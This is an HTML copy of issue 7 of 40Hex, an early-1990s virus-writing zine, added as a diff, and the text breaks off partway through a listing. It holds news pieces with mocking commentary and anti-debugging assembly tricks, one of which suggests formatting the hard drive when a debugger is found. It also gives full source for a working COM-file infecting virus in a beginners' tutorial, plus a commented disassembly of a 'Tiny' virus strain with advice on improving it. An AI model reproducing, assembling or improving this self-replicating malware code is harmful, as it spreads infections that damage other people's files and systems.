@@ -1,0 +1,930 @@
+<html>
+<head><title>Group 42 Sells Out [40H 7.2.3]</title></head>
+<body background="40hex.jpg">
+<center>
+<h2>40Hex Number 7 Volume 2 Issue 3</h2>
+</center>
+<pre>
+40Hex Number 7 Volume 2 Issue 3                                       File 000
+
+    Welcome to 40Hex issue 7!  As you may have noticed, we are a little
+late in releasing this issue.  This is mainly because very little has
+gone on for us to write about.  Enough of the excuses, on with the show.
+We are going to start by giving you a little news update on what we've
+been up to.
+    First of all, Hellraiser is back in New York.  He moved back towards
+the end of May.  Once he gets settled and I give him his computer, I am
+sure he will be back writing more virii, and possibly editing 40Hex (not
+sure if he wants the task of editing 40Hex).  Anyways, to say the
+least, its great having him back where he belongs.
+    Second, we have several new virii out, these will NOT appear on
+Virus BBSs.  Not even ours.  The reason is simple.  Anti-Virus people
+are not in the dark anymore.  They are on Virus BBSs.  Since we want our
+virii to remain as undetectable as possible, giving them to the general
+public is just no longer an option.  Nonetheless, the new virii will be
+sure to surprise everyone.
+    Third, LandFill BBS is back online.  The number won't be given out
+in the mag, I don't want it getting posted on FidoNet.  I am silly that
+way.  The other reason I am not putting the number in it is because I
+don't want 100+ lamers reading it, and giving the BBS a call.
+    Fourth, a new installment of Dark Angel's Virus Writing Guide came
+out, get it, it is chunky.
+    Finally, greetings to three new members, Black Mischief (Hacker), and
+iNVALiD MEDiA (Hacker, SysOp Of Unphamiliar Territories, which is now
+invite only!), and Stingray(Ex-VIPER).
+
+
+                       Table Of Contents
+
+       40Hex-7.000....................You've Just Read it
+       40Hex-7.001....................Virii in the News Part I
+       40Hex-7.002....................Code Concealment [2]
+       40Hex-7.003....................An Introduction to Non-overwriting Virii
+       40Hex-7.004....................Enough Tinys to Sink a Ship
+       40Hex-7.005....................MtE News Stories
+       40Hex-7.006....................Virus Spotlite:Dissassembly of Leap Frog
+       40Hex-7.007....................Spammies Reminder
+       40Hex-7.008....................Virii in the News Part II
+       40Hex-7.009....................Debug Script for Pogue Mahone
+
+
+    Greets to: [NuKE], VIPER, All of the Spammies Entries,
+               All -=PHALCON/SKISM=- Members, Dark Avenger
+               and anyone else that keeps the virus scene
+               going strong.
+
+                                        ->GHeap!
+40Hex Number 7 Volume 2 Issue 3                                       File 001
+
+      WISHFUL THINKING WILL NOT MAKE PUBLICITY-SEEKING VIRUSES GO AWAY
+
+     [Hmmmm, a publicity seeking virus.  I had a virus like that.  It
+      infected my computer and called every news agency telling them what it
+      had done.]
+
+                 By: Paul Melka for Infoworld 4/27
+
+    We have all heaved a collective sigh since March 6 came and went
+with little computer damage from the Michelangelo Virus.  But this sense
+of relief obscures what I believe is a very important fact: Michelangelo
+was a turning point in the industry, as much as Microsoft's Windows 3.0
+was.
+    Prior to March 6, the trigger date for the virus, many people hours
+were spent in organizations large and small trying to prepare for
+attack. [Gimme a break.  An 'attack'.] And when all said and done,
+PCs in the United States fared pretty well.  Still everyone's memory of
+the Michelangleo virus has begun to fade, and the press - which
+thoroughly covered the looming threat - is now focused on how little
+damage was done or how much money virus-protection vendors made.
+    That frustrates me.  It misses a subtle yet more important aspect of
+viruses:  With all the publicity that Michelangelo generated, it was
+the forerunner of more powerful and more destructive viruses.
+    The publicity from Michelangelo threw down the gauntlet to virus
+writers to create newer and more destructive viruses.  Gone are the days
+when letters simply fall to the bottom of your screen or you get
+prompted by messages asking for cookies or birthday greetings.  The
+industry is just beginning to see the emergence of polymorphic viruses
+that change their signatures with each infection.(Already a working
+version of the self-mutating engine that creates polymorphic viruses is
+available on some bulletin boards, along with manuals.)  And we are
+beginning to see viruses that are specifically designed to foil various
+detection applications.  Finally there are shrink-wrapped applications
+infected with viruses; now there is no "safe" way to purchase software.
+    The virus software authors also have an advantage over all antivirus
+authors in that they can see exactly what they are going against, while
+the antivirus developers still have to react to new, unknown viruses.
+    What types of viruses are next?  I don't know, and probably most of
+the experts don't know either.  But you can certainly speculate on the
+various directions that could be taken in the very near future.  We have
+already seen the evolution from file infecting viruses, boot sector
+viruses, and stealth viruses to polymorphic viruses.
+    The increase in the number and occurences of viruses is real.
+Products less then a year old that search for "over 300 viruses" are
+almost laughed at today, as security specialists cite documentation of
+more than 1,000 different strains of viruses.  The National Computer
+Security Association estimates that by the end of 1994, there will be
+almost 40,000 different virus strains. [A shame they will mostly be
+Tiny variants and Jerusalem Hacks]
+    With that kind of explosion, new protection methods will be needed.
+Most of today's scanners would spent more time scanning each file for
+viruses  than there are working hours in a day.  We will see better and
+more efficient methods of detecting and preventing viruses that still
+allow full use of the computer.
+    As a security analyst for a large utility company, I try to keep
+everyone educated on the dangers of viruses and how best to avoid them.
+I also try to keep myself and the company as up to date as possible on
+what is happening with viruses.  But unless everyone realizes that
+viruses are real and takes reasonable action against them, there will
+come a time when a new "super virus" that cannot be detected by any of
+the existing packages is developed. [Wonder who is gonna write that one?]
+It will literally cripple some major corporations, while destroying other
+businesses completely.
+    I don't advise going back to paper and pencil, but I do think that
+all PC users have to be vigilant about the threat of viruses, to educate
+themselves on the prevention of viruses, and to institute "safe"
+practices, including backing up data and using virus-protection
+software.
+
+The official patented 40-Hex rebuttal:
+
+    Paul Melka seems to be fairly accurate.  However, there are some
+things I feel are wrong.  For example the estimation that there will
+be 40,000 virus strains by the end of 1994.  Let's just say for example
+that it is about 2 years away.  That would mean that there would be 53
+viruses written a day, or 2.2 viruses written an hour!  Jeez, we all
+have a shitload of work to do.  Do you find this hard to believe?  I do.
+Of course, the way the virus scene is heading, we are becoming like the
+warez scene.  All the half-assed fools spreading stuff to other BBSs, not
+even seeing what they are, or if they are real.  Ahh well, enough of my
+complaints.
+    When Mr. Melka mentioned that there was no "safe" way of purchasing
+software, it got me thinking.  He is definately correct.  Of course, I feel
+that it is the responsibility of all software publishers to check their
+disks before packaging them.
+    At first, he seemed to be very neutral, but as the article
+progressed, I noticed that even Mr. Melka seemed to fall down the
+endless pit of ignorance, and resorted to a scare tactic: a virus that
+nothing can detect or kill.  He started off saying that he was
+speculating, but when he said "...there WILL come a time when a new 'super
+virus' that cannot be detected by any of the existing packages is
+developed.  It will literally cripple some major corporations, while
+destroying other businesses completely."  he said WILL.  It bothers me
+that a member of the computer security community would be so close-
+minded.
+    We are not trying to justify the writing of virii, mainly because we
+don't have to.  It isn't illegal.  Making it illegal can't be done; it
+takes away our rights.  Of course, we want to distinguish that we don't
+spread our virii to anyone who doesn't know that they are virii.  It is
+what they do from there that may be against the law.
+
+
+    If you think it stopped here, here is a letter to the editor of
+Infoworld about the above article:
+
+
+    Both Steve Gibson and Peer-to-Peer columnist Paul Melka have hit on
+the reason for the current explosion of viruses.  The key is in the title
+to Mr. Melka's column: "Publicity-Seeking."
+    Virus writers have the same mentality as chain mail writers: They
+like to see how far their viruses spread and they track the spread of
+their virus by its nickname.  The glory from this spread would be
+greatly diminished if viruses were referred to by mundane serial numbers
+like 7B386621C rather than captivating nicknames like Michelangelo.
+    I would like to lead a campaign [The Anti Virus Crusades!  Ha!  I
+love it!] on two fronts:
+    First:  Establish a no-nickname rule.  The National Computer
+Security Association and other groups should start referring to viruses
+with nondescriptive serial numbers rather than glamorous nicknames.
+    Second:  Ask other readers to write representatives and demand
+legislation that would impose suitable penalties for malicious computer
+crimes.  These penalties would include jail terms. [GULP!]
+    In closing, I believe that this is a perfect opportunity for BIOS
+manufacturers to sell BIOS upgrades.  Mr. Gibson's observation that the
+best defense mechanism for existing viruses lies in the ROM BIOS is
+absolutely correct.  Seventy-four percent of virus infections could be
+eliminated by a simple BIOS change.  I am part of a support center for
+more than 5,000 PCs; I have yet to detect a virus on those few PCs that
+boot only from the hard drive.
+                                               Marvin Bullock [Buttock?]
+                                                Nashville, TN
+
+
+Rebuttal part ][
+----------------
+    Ok, this guy I don't really respect.  The no-nickname rule.  W0W!
+What a concept.  Because you take the name away from my program, I won't
+recognize when some one posts "Oh yeah, The virus 7XZ23576B upon
+activation a siren is heard as a ambulance is displayed across the
+screen."   We'd never pick up on that.  I also want to know where he got
+the 74% figure.  It may be true, but it wasn't documented.  I am not
+going to argue the anti-virus issue, as I can only speculate.
+Basically, it takes a twit to catch a virus.  Watch what is put on your
+system.  If you are a system administrator, don't allow standard write
+access to the network drives.  If you do, expect a message like "Your
+computer is stoned".  In reality, YOU should be.
+
+PS:Gibson's article refered to the Dark Avenger's MtE, worthwhile if
+you don't know about it, otherwise, it is pointless.
+
+                                        ->GHeap
+40Hex Number 7 Volume 2 Issue 3                                       File 002
+
+
+              þ Code Concealment             þ
+              þ    -Demogorgon/PHALCON/SKISM þ
+
+     In the previous issue of 40hex, I wrote about how a programmer can
+keep his code from being stolen by others.  Ways of doing this are
+endless, and I will talk about a few more methods in this installment.
+
+Part I  : Fun with int3
+Part II : Fun with int8
+Part III: The Prefetch
+
+
+Part_I : Fun with int3
+
+     Int three is the debugger breakpoint.  Every time a debugger breaks
+while tracing through a chunk of code, it will call int3.  Int3 is
+called after every instruction is executed in trace mode, and after
+a breakpoint is reached.  Note that protected mode debuggers do not
+execute int3 in trace mode, but they will break when int3 is called from
+your code.  You can use this to your advantage.  Simply install a new
+handler for int3 and it will execute instead of the debugger if a thief
+tries to trace through your program.
+
+start:  mov     ax, 2503h
+        mov     dx, offset int_start
+        int     21h                     ; put in the new handler at ds:dx
+
+        ...             ; rest of real code here
+        int     20h
+
+text db 'Smoke Mah Ass!$'
+int_start:
+        mov     ah, 9
+        mov     dx, offset text
+        int     21h
+        int     20h
+
+     As soon as the first int21 call in this program is made, the code
+at int_start will execute if it is being traced in a debugger.
+Otherwise, the int call will be ignored and your normal code will
+execute.  The program can do whatever you want if a debugger is found.
+For example, you can format the hard drive or display a message.  The
+possabilities are endless.  By the way, it might be wise to restore the
+old interrupt handler before you exit the program, because it is bad
+programming practice to leave interrupts pointed into non-allocated
+memory.
+
+
+compatability:(works against all debuggers marked with an X)
+-------------------------------------------------------------------------
+Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
+  X                   X
+-------------------------------------------------------------------------
+
+
+Part_II: Fun with int8
+
+     The next segment will show you how to make a program nearly
+impossable to trace.  The concept is simple.  All you need to do is
+place the main body ofyour program into an int8 handler.  Int8 is the
+timer interrupt, and it is called 18.2 times a second.  Debuggers do not
+execute int8, so whatever you put there will only go when it is run from
+dos.  The only drawback to this is a short delay before the main program
+is executed.  It will probably go unnoticed, in most cases.  Here is
+some code:
+
+thyroid:mov     ax, 3508h
+        int     21h                        ; get int8 handler
+        mov     word ptr [int_store], bx   ; store it
+        mov     word ptr [int_store+2], es
+        mov     dx, offset prog_start
+        mov     ah, 25h
+        int     21h                        ; install new int8 handler
+
+yip:    cmp     flaag, 1
+        jne     yip             ; wait for int8 to be called
+                        ; int8 must set the flaag to 1
+        push    bx
+        pop     dx      ; restore
+        push    es      ; old
+        pop     ds      ; int8
+        int     21h     ; handler
+        int     20h
+
+flaag db 0
+int_store dd ?
+prog_start:
+_main_program proc far
+        ; save all the necessary registers here
+        ; ... your code
+        mov     flaag, 1
+        ; restore the registers
+
+        jmp dword ptr [offset int_store]  ; chain to real int8 handler
+_main_program endp
+
+     This code is quite useful in that if some guy tries to trace
+through it, he will be stuck forever in the 'yip' loop.  The main code
+will never be executed.  If he tries to get out of the loop by
+'executing to' the next instruction, he will end up running the entire
+program.  No debugger I know of can trace through this, because int8 is
+not called from within the debugger.
+
+-------------------------------------------------------------------------
+Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
+  X                   X                         X                   X
+-------------------------------------------------------------------------
+
+
+Part_III: The Prefetch
+
+     My favorite way to confuse debuggers is to mess with the prefetch
+queue.  All intel processors have a small queue where the next
+instructions to be executed are stored.  In this way, the CPU does not
+have to waste clock cycles by fetching the next instruction, except in
+the cases of branching instructions such as jmps and calls.  The next
+chunk of code makes use of this:
+
+eapple: mov     ah, 9
+        mov     word ptr [offset ear_lobe-2], offset sukk_debug
+        mov     dx, offset text
+ear_lobe:
+        int     21h
+        int     20h
+
+text    db 'snee!$'
+sukk_debug db 0Ah, 0Dh, 09h, 'blow a goat!', 07h, 0Ah, 0Dh, '$'
+
+     All this program does is print out a text string.  If it is run
+from dos, it will print out 'snee!'.  If it is traced through by any
+debugger, however, it will print 'blow a goat!', and beep the PC speaker
+(07h is ctrl-g).  Let me explain how this works.
+     When any chunk of code is executed by dos, the first few bytes are
+sent into the prefetch queue.  The actual number of bytes depends on the
+model of intel chip, and what year it was made in.  My computer is a
+386DX-20 (early model), which has a 16 byte prefetch.  Be sure to check
+your code on several machines to insure compatability.
+     When the second instruction is reached, it places the offset of
+sukk_debug into the next instruction.  That is, the next instruction
+becomes 'mov dx, offset sukk_debug', rather than 'mov dx, offset text'.
+The system memory will be changed, but the prefetch will not, therefore
+only a debugger will respond to the new code.  Dos will execute it as if
+the instruction had never changed, because the instruction will already
+have been loaded into the prefetch.  This theory can be used, with a
+little modification, in order to branch to various subroutines, rather
+than just printing out different text.  One interesting application of
+this is to use the prefetch area to store registers.  This way, a person
+debugging your code can not simply nop it out, because it will be
+referred to later on.  In fact, you can even put the stack on the
+prefetch.  Try to debug through the following fragment, and watch what
+happens:
+
+nee:    mov     ax, 4Ch
+        mov     dx, offset text
+        mov     sp, offset fin_rot
+        push    ax
+        mov     ah, 9
+fin_rot:int     21h
+        pop     ax
+        int     21h
+text:   db      'Duck is proud of her feet.  They can catch things.$'
+
+     If you run it through debug, the entire program will be corrupted
+as soon as you move the stack pointer.  This is because the debug code
+uses the stack and expects it to be in a safe location.  If you run it
+through soft ice, the code will be corrupted as soon as you push ax.
+The stack area will be overwritten when int21 is executed, because the
+interrupt uses the stack.  However, in this example, the instruction
+pointer will already be beyond this area, so the program will execute
+normally.
+     Remember not to place the stack past any calls, because then the
+prefetch would have to be reloaded after the main program was returned
+to, and the instructions that were there before will be gone.
+
+-------------------------------------------------------------------------
+Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
+  X                   X                         X                   X
+-------------------------------------------------------------------------
+
+     That about wraps it up for this installment.  I will probably have
+some new methods for you the next issue, unless I get bored and decide
+to drop the whole idea.  Keep in mind that the best ideas are your own.
+
+                              
+        Remember:  Unprotected code is public domain!
+                              
+
+[]     If anyone has any questions or comments about my series,   []
+ []    or some more suggestions for methods that can be added to   []
+  []   it, feel free to drop me a note on Landfill BBS              []
+40Hex Number 7 Volume 2 Issue 3                                       File 003
+
+                    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                    An Introduction to Nonoverwriting Virii
+                                 By Dark Angel
+                    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  
+  It seems that there are quite a few virus writers out there who just sit at
+  home and churn out hacks of virii.  Yay.  Anybody with a disassembler and
+  some free time can churn out dozens of undetectable (unscannable) variants
+  of any given virus in an hour.  Others have not progressed beyond the
+  overwriting virus, the type of virus with the most limited potential for
+  spreading.  Still others have never written a virus before and would like
+  to learn.  This article is designed as a simple introduction to all
+  interested to the world of nonoverwriting virii.  All that is assumed is a
+  working knowledge of 80x86 assembly language.
+  
+  Only the infection of COM files will be treated in this article, since the
+  infection routine is, I think, easier to understand and certainly easier to
+  code than that of EXE files.  But do not dispair!  EXE infections will be
+  covered in the next issue of 40Hex.
+  
+  COM files are described by IBM and Microsoft as "memory image files."
+  Basically, when a COM file is run, the file is loaded as is into memory.
+  No translation or interpretation of any sort takes place.  The following
+  steps occur when a COM file is run:
+  
+    1) A PSP is built.
+    2) The file is loaded directly above the PSP.
+    3) The program is run starting from the beginning.
+  
+  The PSP is a 256 byte header storing such vital data as the command line
+  parametres used to call the program.  The file is located starting at
+  offset 100h of the segment where the program is loaded.  Due to the 64K
+  limit on segment length, COM files may only be a maximum of 64K-100h bytes
+  long, or 65280 bytes.  If you infect a COM file, make sure the final size
+  is below this amount or the PSP will get corrupted.
+  
+  Since the beginning of the file is at offset 100h in the segment (this is
+  the reason for the org 100h at the start of assembly source for com files),
+  the initial IP is set to 100h.  The key to understanding nonoverwriting COM
+  virii is to remember that once the program is loaded into memory, it can be
+  changed at will without affecting the actual file on disk.
+  
+  The strategy of an overwriting virus is to write the virus to the beginning
+  of the COM file.  This, of course, utterly annihilates the original program.
+  This, of course, is lame.  The nonoverwriting virus changes only the first
+  few bytes and tacks the virus onto the end of the executable.  The new
+  bytes at the beginning of the file cause the program, once loaded, to jump
+  to the virus code.  After the virus is done executing, the original first
+  few bytes are rewritten to the area starting at 100h and a jmp instruction
+  is executed to that location (100h).  The infected program is none the
+  worse for the wear and will run without error.
+  
+  The trick is to find the correct bytes to add to the beginning of the file.
+  The most common method is to use a JMP instruction followed by a two byte
+  displacement.  Since these three bytes replace three bytes of the original
+  program, it is important to save these bytes upon infection.  The JMP is
+  encoded with a byte of 0e9h and the displacement is simply the old file
+  length minus three.
+  
+  To replace the old bytes, simply use code similar to the following:
+    mov di, 100h
+    mov si, offset saved_bytes
+    movsw
+    movsb
+  
+  And to return control to the original program, use the following:
+    mov di, 100h
+    jmp di
+  
+  or any equivalent statements.
+  
+  When writing nonoverwriting virii, it is important to understand that the
+  variables used in the code will not be in their original locations.  Since
+  virii are added to the end of the file, you must take the filesize into
+  account when calculating offsets.  The standard procedure is to use the
+  short combination of statements:
+  
+    call oldtrick
+  oldtrick:
+    pop  bp                           ; bp = current IP
+    sub  bp, offset oldtrick          ; subtract from original offset
+  
+  After these statements have been executed, bp will hold the difference in
+  the new offsets of the variables from the original.  To account for the
+  difference, make the following substitutions in the viral code:
+  
+    lea dx, [bp+offset variable]
+  instead of
+    mov dx, offset variable
+  
+  and
+  
+    mov dx, word ptr [bp+offset variable]
+  instead of
+    mov dx, word ptr variable
+  
+  Alternatively, if you want to save a few bytes and are willing to suffer
+  some headaches, leave out the sub bp, offset oldtrick and calculate all
+  offsets as per the procedure above EXCEPT you must now also subtract offset
+  oldtrick from each of the offsets.
+  
+  The following is a short nonoverwriting virus which will hopefully help in
+  your understanding of the techniques explained above.  It's sort of cheesy,
+  since I designed it to be small and easily understandable.  In addition to
+  being inefficient (in terms of size), it fails to preserve file date/time
+  and will not infect read-only files.  However, it serves its purpose well
+  as a teaching aid.
+
+  --------Tear line----------------------------------------------------------
+  
+  DumbVirus segment
+  Assume    CS:DumbVirus
+  Org 100h                 ; account for PSP
+  
+  ; Dumb Virus - 40Hex demo virus
+  ; Assemble with TASM /m2
+  
+  Start:  db      0e9h     ; jmp duh
+          dw      0
+  
+  ; This is where the virus starts
+  duh:    call    next
+  next:   pop     bp                   ; bp holds current location
+          sub     bp, offset next      ; calculate net change
+  
+  ; Restore the original first three bytes
+          lea     si, [bp+offset stuff]
+          mov     di, 100h
+  ; Put 100h on the stack for the retn later
+  ; This will allow for the return to the beginning of the file
+          push    di
+          movsw
+          movsb
+  
+  ; Change DTA from default (otherwise Findfirst/next will destroy
+  ; commandline parametres
+          lea     dx, [bp+offset dta]
+          call    set_dta
+  
+          mov     ah, 4eh           ; Find first
+          lea     dx, [bp+masker]   ; search for '*.COM',0
+          xor     cx, cx            ; attribute mask - this is unnecessary
+  tryanother:
+          int     21h
+          jc      quit              ; Quit on error
+  
+  ; Open file for read/write
+  ; Note: This fails on read-only files
+          mov     ax, 3D02h
+          lea     dx, [bp+offset dta+30] ; File name is located in DTA
+          int     21h
+          xchg    ax, bx
+  
+  ; Read in the first three bytes
+          mov     ah, 3fh
+          lea     dx, [bp+stuff]
+          mov     cx, 3
+          int     21h
+  
+  ; Check for previous infection
+          mov     ax, word ptr [bp+dta+26]       ; ax = filesize
+          mov     cx, word ptr [bp+stuff+1]      ; jmp location
+          add     cx, eov - duh + 3              ; convert to filesize
+          cmp     ax, cx                         ; if same, already infected
+          jz      close                          ; so quit out of here
+  
+  ; Calculate the offset of the jmp
+          sub     ax, 3                          ; ax = filesize - 3
+          mov     word ptr [bp+writebuffer], ax
+  
+  ; Go to the beginning of the file
+          xor     al, al
+          call    f_ptr
+  
+  ; Write the three bytes
+          mov     ah, 40h
+          mov     cx, 3
+          lea     dx, [bp+e9]
+          int     21h
+  
+  ; Go to the end of the file
+          mov     al, 2
+          call    f_ptr
+  
+  ; And write the rest of the virus
+          mov     ah, 40h
+          mov     cx, eov - duh
+          lea     dx, [bp+duh]
+          int     21h
+  
+  close:
+          mov     ah, 3eh
+          int     21h
+  
+  ; Try infecting another file
+          mov     ah, 4fh                        ; Find next
+          jmp     short tryanother
+  
+  ; Restore the DTA and return control to the original program
+  quit:   mov     dx, 80h                        ; Restore current DTA to
+                                                 ; the default @ PSP:80h
+  set_dta:
+          mov     ah, 1ah                        ; Set disk transfer address
+          int     21h
+          retn
+  f_ptr:  mov     ah, 42h
+          xor     cx, cx
+          cwd                                    ; equivalent to: xor dx, dx
+          int     21h
+          retn
+  
+  masker  db      '*.com',0
+  ; Original three bytes of the infected file
+  ; Currently holds a INT 20h instruction and a null byte
+  stuff   db      0cdh, 20h, 0
+  e9      db      0e9h
+  eov equ $                                      ; End of the virus
+  ; The following variables are stored in the heap space (the area between
+  ; the stack and the code) and are not part of the virus that is written
+  ; to files.
+  writebuffer dw  ?                              ; Scratch area holding the
+                                                 ; JMP offset
+  dta         db 42 dup (?)
+  DumbVirus    ENDS
+               END     Start
+
+  ---------------------------------------------------------------------------
+
+  Do not worry if not everything makes sense to you just yet.  I tried to
+  keep the example virus as simple as possible, although, admittedly, the
+  explanations were a bit cryptic.  It should all come to you in time.
+  
+  For a more complete discussion of nonoverwriting virii, pick up a copy of
+  each of the first three parts of my virus writing guide (the phunky, the
+  chunky, and the crunchy), where you may find a thorough tutorial on
+  nonresident virii suitable for any beginning virus programmer.
+
+40Hex Number 7 Volume 2 Issue 3                                       File 004
+
+I picked up a file touted as "a very small virus" and decided to figure out
+what this virus could be.  SCAN86-B turned up nothing, so I had to disassemble
+it.  The name was intriguing -- muttiny.  I thought it was a misspelling of
+mutiny, but I was terribly wrong.  After a minute, I had infected a carrier
+file and decrypted the virus.  It took but one minute more to disassemble and
+maybe half an hour to comment.  Argh!  It is yet another TINY strain!
+
+I do not know who the author is, but I had a few comments to make.  This virus,
+quite frankly, sucks.  It is a pitiful excuse for programming.  Many, many
+improvements can be made.  I have put comments on how this virus could be made
+much mo' bettah.  I must tell whoever wrote the virus that TINY is not so tiny
+anymore.  The original TINYs were 150 bytes long.  Now look at it!  It is over
+twice that size!  I suppose this virus is the "MUTated TINY" variant, but I'd
+prefer to call it "Messed Up Totally TINY".  The author MUST clean up the
+virus before distributing it to everyone!  One further improvement would be to
+make this virus a generic COM infector, which can be done in well under 200
+bytes, with all the "functionality" of the current version.  Note that this
+time I did not rewrite it, a la Tiny F 1.1, but rather merely suggested
+improvements.  This way, you can easily see the bugs for yourself and learn
+from the author's pitfalls.
+
+              Dark Angel of PHALCON/SKISM     4/23/92
+
+P.S. This is a byte-to-byte match of the virus I picked up -- even the
+     labels are in their correct offsets.  The file below should match
+     the source code of the original carrier file exactly. Assemble w/
+     TASM /m2.
+
+P.P.S. This is the last Tiny strain to be published in 40Hex. For some
+     Reason, Tiny strains seem to come up again and again over here. I
+     think it is hightime to put the Tiny series in its grave where it
+     belongs.  Amen.  So be it.                                     DA
+
+muttiny         segment byte public
+                assume  cs:muttiny, ds:muttiny
+
+                org     100h
+
+start:          db      0e9h, 5, 0              ; jmp     startvir
+restorehere:    int     20h
+idword:         dw      990h
+; The next line is incredibly pointless. It is a holdover from one
+; of the original TINYs, where the id was 7, 8, 9.  The author can
+; easily save one byte merely by deleting this line.
+                db      09h
+startvir:
+                call    oldtrick                ; Standard location-finder
+oldtrick:       pop     si
+; The following statement is a bug -- well, not really a bug, just
+; extraneous code.  The value pushed on the stack in the following
+; line is NEVER popped off. This is messy programming, as one byte
+; could be saved by removing the statement.
+                push    si
+                sub     si,offset oldtrick
+                call    encrypt                 ; Decrypt virus
+                call    savepsp                 ;  and save the PSP
+; NOTE:  The entire savepsp/restorepsp procedures are unnecessary.
+;        See the procedures at the end for further details.
+                jmp     short findencryptval    ; Go to the rest of the virus
+; The next line is another example of messy programming -- it is a
+; NOP inserted by MASM during assembly.  Running this file through
+; TASM with the /m2 switch should eliminate such "fix-ups."
+                nop
+; The next line leaves me guessing as to the author's true intent.
+                db      0
+
+encryptval      dw      0h
+
+encrypt:
+                push    bx                      ; Save handle
+; The following two lines of code could be condensed into one:
+;       lea bx, [si+offset startencrypt]
+; Once again, poor programming style, though there's nothing wrong
+; with the code.
+                mov     bx,offset startencrypt
+                add     bx,si
+; Continueencrypt is implemented as a jmp-type loop. Although it's
+; fine to code it this way, it's probably easier to code using the
+; loop statement.  Upon close inspection, one finds the loop to be
+; flawed. Note the single inc bx statement. This essentially makes
+; the encryption value a a byte instead of a word, which decreases
+; the number of mutations from 65,535 to 255.  Once again, this is
+; just poor programming, very easily rectified with another inc bx
+; statement. Another optimization could be made.  Use a
+;       mov dx, [si+encryptval]
+; to load up the encryption value before the loop, and replace the
+; three lines following continueencrypt with a simple:
+;       xor word ptr [bx], dx
+continueencrypt:
+                mov     ax,[bx]
+                xor     ax,word ptr [si+encryptval]
+                mov     [bx],ax
+                inc     bx
+; The next two lines should be executed BEFORE continueencrypt. As
+; it stands right now, they are recalculated every iteration which
+; slows down execution somewhat. Furthermore, the value calculated
+; is much too large and this increases execution time. Yet another
+; improvement would be the merging of the mov/add pair to the much
+; cleaner lea cx, [si+offset endvirus].
+                mov     cx,offset veryend       ; Calculate end of
+                add     cx,si                   ; encryption: Note
+                cmp     bx,cx                   ; the value is 246
+                jle     continueencrypt         ; bytes too large.
+                pop     bx
+                ret
+writerest:                                      ; Tack on the virus to the
+                call    encrypt                 ; end of the file.
+                mov     ah,40h
+                mov     cx,offset endvirus - offset idword
+                lea     dx,[si+offset idword]   ; Write starting from the id
+                int     21h                     ; word
+                call    encrypt
+                ret
+
+startencrypt:
+; This is where the encrypted area begins.  This could be moved to
+; where the ret is in procedure writerest, but it is not necessary
+; since it won't affect the "scannability" of the virus.
+
+findencryptval:
+                mov     ah,2Ch                  ; Get random #
+                int     21h                     ; CX=hr/min dx=sec
+; The following chunk of code puzzles me. I admit it, I am totally
+; lost as to its purpose.
+                cmp     word ptr [si+offset encryptval],0
+                je      step_two
+                cmp     word ptr [si+offset encryptval+1],0
+                je      step_two
+                cmp     dh,0Fh
+                jle     foundencryptionvalue
+step_two:                                       ; Check to see if any
+                cmp     dl,0                    ; part of the encryption
+                je      findencryptval          ; value is 0 and if so,
+                cmp     dh,0                    ; find another value.
+                je      findencryptval
+                mov     [si+offset encryptval],dx
+foundencryptionvalue:
+                mov     bp,[si+offset oldjmp]   ; Set up bp for
+                add     bp,103h                 ; jmp later
+                lea     dx,[si+filemask]        ; '*.COM',0
+                xor     cx,cx                   ; Attributes
+                mov     ah,4Eh                  ; Find first
+tryanother:
+                int     21h
+                jc      quit_virus              ; If none found, exit
+
+                mov     ax,3D02h                ; Open read/write
+                mov     dx,9Eh                  ; In default DTA
+                int     21h
+
+                mov     cx,3
+                mov     bx,ax                   ; Swap file handle register
+                lea     dx,[si+offset buffer]
+                mov     di,dx
+                call    read                    ; Read 3 bytes
+                cmp     byte ptr [di],0E9h      ; Is it a jmp?
+                je      infect
+findnext:
+                mov     ah,4Fh                  ; If not, find next
+                jmp     short tryanother
+infect:
+                mov     ax,4200h                ; Move file pointer
+                mov     dx,[di+1]               ; to jmp location
+                mov     [si+offset oldjmp],dx   ; and save old jmp
+                xor     cx,cx                   ; location
+                call    int21h
+                jmp     short skipcheckinf
+; Once again, we meet an infamous MASM-NOP.
+                nop
+; I don't understand why checkinf is implemented as a procedure as
+; it is executed but once.  It is a waste of code space to do such
+; a thing. The ret and call are both extra, wasting four bytes. An
+; additional three bytes were wasted on the JMP skipping checkinf.
+; In a program called "Tiny," a wasted seven bytes is rather large
+; and should not exist.  I have written a virus of half the length
+; of this virus which is a generic COM infector. There is just too
+; too much waste in this program.
+checkinf:
+                cmp     word ptr [di],990h      ; Is it already
+                je      findnext                ; infected?
+; The je statement above presents another problem. It leaves stuff
+; on the stack from the call.  This is, once again, not a critical
+; error but nevertheless it is extremely sloppy behavior.
+                xor     dx,dx
+                xor     cx,cx
+                mov     ax,4202h
+                call    int21h                  ; Goto end of file
+                ret
+skipcheckinf:
+                mov     cx,2
+                mov     dx,di
+                call    read                    ; read 2 bytes
+                call    checkinf
+; The next check is extraneous.  No COM file is larger than 65,535
+; bytes before infection simply because it is "illegal."  Yet ano-
+; ther waste of code.  Even if one were to use this useless check,
+; it should be implemented, to save space, as or dx, dx.
+                cmp     dx,0                    ; Check if too big
+                jne     findnext
+
+                cmp     ah,0FEh                 ; Check again if too big
+                jae     findnext
+                mov     [si+storejmp],ax        ; Save new jmp
+                call    writerest               ;     location
+                mov     ax,4200h                ; Go to offset
+                mov     dx,1                    ; 1 in the file
+                xor     cx,cx
+                call    int21h
+
+                mov     ah,40h                  ; and write the new
+                mov     cx,2                    ; jmp location
+                lea     dx,[si+storejmp]
+                call    int21h
+; I think it is quite obvious that the next line is pointless.  It
+; is a truly moronic waste of two bytes.
+                jc      closefile
+closefile:
+                mov     ah,3Eh                  ; Close the file
+                call    int21h
+quit_virus:
+                call    restorepsp
+                jmp     bp
+
+read:
+                mov     ah,3Fh                  ; Read file
+; I do not understand why all the int 21h calls are done with this
+; procedure.  It is a waste of space. A normal int 21h call is two
+; bytes long while it's three bytes just to call this procedure!
+int21h:
+                int     21h
+                ret
+
+                db      'Made in England'
+
+; Note: The comments for savepsp also apply to restorepsp.
+
+; This code could have easily been changed to a set active DTA INT
+; 21h call (AH = 1Ah).  It would have saved many, many bytes.
+
+savepsp:
+                mov     di,0
+; The following is a bug.  It should be
